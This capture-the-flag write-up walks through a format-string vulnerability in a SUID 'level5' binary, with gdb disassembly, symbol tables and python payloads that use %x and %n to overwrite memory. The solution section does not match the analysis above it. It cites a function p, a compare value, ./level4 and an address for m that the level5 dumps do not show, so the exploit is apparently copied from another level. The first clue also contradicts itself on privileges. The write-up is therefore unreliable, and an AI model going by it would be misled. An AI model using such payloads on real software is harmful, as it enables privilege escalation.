# Level 5

## First clue
- once logged in as level4 we find again an executable with the same behavior of ./level4, `level5` owned by `level6` and the SUID (SET USER ID) bit set(indicated by the s in place of the execute permission for the owner (rws)) that means that when anyone execute the file it will run with the privileges of level5, not the person executing it
- we try to execute it without arguments and we get the prompt back
- if we write something, that something is copied back as output

## Inspect with gdb
- The binary contains printf, fgets, system, external functions used for input/output operations and executing commands, indicating potential interaction with the user and system.
```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb)


```
- there are three main functions, `main`, `o` and `n`
- first we inspect main
## Main
```
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    

```
- main is simple, makes a stack alignment and call function `n`, as in level4
## Function n

```
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>

```
- allocates 0x218 = 536 bytes
- reads input from user using fgets, storing input in buffer at 0x208(%ebp)
- it calls printf function (that is at address 0x8048380) with as argument the user input retrieved with fget and stored in 0x208 
- it exits wihout returning
## Function o
```
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt> 
End of assembler dump.

```
- prepares the stack frame
- allocates 24 bytes (0x18 in hexa)
- the movl $0x80485f0, (%esp) instruction prepares an argument to be passed to the system function. It's placing the address 0x80485f0 onto the stack, which will serve as the argument to the system function call.
- The call 0x80483b0 <system@plt> instruction then calls the system function, passing the address 0x80485f0 as its argument. This means that the system function will execute the command specified at the memory address 0x80485f0.

## Vulnerability
- in function n the user input is not properly sanitized before being passed to the printf function, so we still have a control string vulnerability, but unlike in level4 we don't have a return and the system call is in function o, that is not called anywhere. So we need to manipulate the printf function call in order for it to write the address of the function o (that takes no argument and likely execute the shell command) and execute it, but how?


## Toward the Solution
- back to function n, it compares the content of the return of function p with the hexadecimal value 0x1025544, at this line `0x08048492 <+59>:  cmp    $0x1025544,%eax`. 0x1025544 is 16930116 in decimal.
If we find a way for function p to return value 16930116n we get true and the system call is triggered. 

## Finding the address where printf write to using the %n format specifier
- ` objdump -t level5`
```
level5:     file format elf32-i386

SYMBOL TABLE:
08048134 l    d  .interp	00000000              .interp
08048148 l    d  .note.ABI-tag	00000000              .note.ABI-tag
08048168 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
0804818c l    d  .gnu.hash	00000000              .gnu.hash
080481b0 l    d  .dynsym	00000000              .dynsym
08048250 l    d  .dynstr	00000000              .dynstr
080482b6 l    d  .gnu.version	00000000              .gnu.version
080482cc l    d  .gnu.version_r	00000000              .gnu.version_r
080482ec l    d  .rel.dyn	00000000              .rel.dyn
080482fc l    d  .rel.plt	00000000              .rel.plt
08048334 l    d  .init	00000000              .init
08048370 l    d  .plt	00000000              .plt
080483f0 l    d  .text	00000000              .text
080485cc l    d  .fini	00000000              .fini
080485e8 l    d  .rodata	00000000              .rodata
080485f8 l    d  .eh_frame_hdr	00000000              .eh_frame_hdr
0804863c l    d  .eh_frame	00000000              .eh_frame
08049738 l    d  .ctors	00000000              .ctors
08049740 l    d  .dtors	00000000              .dtors
08049748 l    d  .jcr	00000000              .jcr
0804974c l    d  .dynamic	00000000              .dynamic
08049814 l    d  .got	00000000              .got
08049818 l    d  .got.plt	00000000              .got.plt
08049840 l    d  .data	00000000              .data
08049848 l    d  .bss	00000000              .bss
00000000 l    d  .comment	00000000              .comment
00000000 l    df *ABS*	00000000              crtstuff.c
08049738 l     O .ctors	00000000              __CTOR_LIST__
08049740 l     O .dtors	00000000              __DTOR_LIST__
08049748 l     O .jcr	00000000              __JCR_LIST__
08048420 l     F .text	00000000              __do_global_dtors_aux
0804984c l     O .bss	00000001              completed.6159
08049850 l     O .bss	00000004              dtor_idx.6161
08048480 l     F .text	00000000              frame_dummy
00000000 l    df *ABS*	00000000              crtstuff.c
0804973c l     O .ctors	00000000              __CTOR_END__
08048734 l     O .eh_frame	00000000              __FRAME_END__
08049748 l     O .jcr	00000000              __JCR_END__
080485a0 l     F .text	00000000              __do_global_ctors_aux
00000000 l    df *ABS*	00000000              level5.c
08049738 l       .ctors	00000000              __init_array_end
0804974c l     O .dynamic	00000000              _DYNAMIC
08049738 l       .ctors	00000000              __init_array_start
08049818 l     O .got.plt	00000000              _GLOBAL_OFFSET_TABLE_
08048590 g     F .text	00000002              __libc_csu_fini
08048592 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
08049840  w      .data	00000000              data_start
00000000       F *UND*	00000000              printf@@GLIBC_2.0
00000000       F *UND*	00000000              _exit@@GLIBC_2.0
080484c2 g     F .text	00000042              n
00000000       F *UND*	00000000              fgets@@GLIBC_2.0
08049848 g       *ABS*	00000000              _edata
080485cc g     F .fini	00000000              _fini
08049744 g     O .dtors	00000000              .hidden __DTOR_END__
08049840 g       .data	00000000              __data_start
00000000       F *UND*	00000000              system@@GLIBC_2.0
00000000  w      *UND*	00000000              __gmon_start__
00000000       F *UND*	00000000              exit@@GLIBC_2.0
08049844 g     O .data	00000000              .hidden __dso_handle
080485ec g     O .rodata	00000004              _IO_stdin_used
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
08048520 g     F .text	00000061              __libc_csu_init
08049848 g     O .bss	00000004              stdin@@GLIBC_2.0
08049858 g       *ABS*	00000000              _end
080483f0 g     F .text	00000000              _start
080485e8 g     O .rodata	00000004              _fp_hw
080484a4 g     F .text	0000001e              o
08049854 g     O .bss	00000004              m
08049848 g       *ABS*	00000000              __bss_start
08048504 g     F .text	0000000d              main
00000000  w      *UND*	00000000              _Jv_RegisterClasses
08048334 g     F .init	00000000              _init

```
- we look for .bss and .data section. what's the difference between them:
 - .data section: This section typically contains initialized data that is statically allocated at compile time. It's writable because the data can be modified during the execution of the program, but it's initialized with predefined values.

 - .bss section: This section typically contains uninitialized data that is statically allocated at compile time but has no predefined values. It's writable because the data can be initialized with values during the execution of the program. 
 - since we want to write to uninitialized data that can be initialized during program execution, we choose the address of the .bss section.

## Finding Buffer Position: 
We first find the position of our buffer in memory by injecting format specifiers into the input string and observing the output. For example:


`python -c 'print "aaaa" + " %x" * 15' | ./level4`

## Manipulating Return Value: 
Once we know the buffer's position, we construct an input string that manipulates the return value of function p to 16930116. This is done by padding the memory address of the variable m and using the %n format specifier.

`python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4`
Here, "\x10\x98\x04\x08" represents the memory address of m, and %16930112d pads the address, while %12$n writes the number of characters processed so far to the address pointed to by the 12th argument.

## Triggering System Call
With the return value manipulated, the comparison in function n will evaluate to true, triggering the system call that directly print the /level5/.pass containing the flag
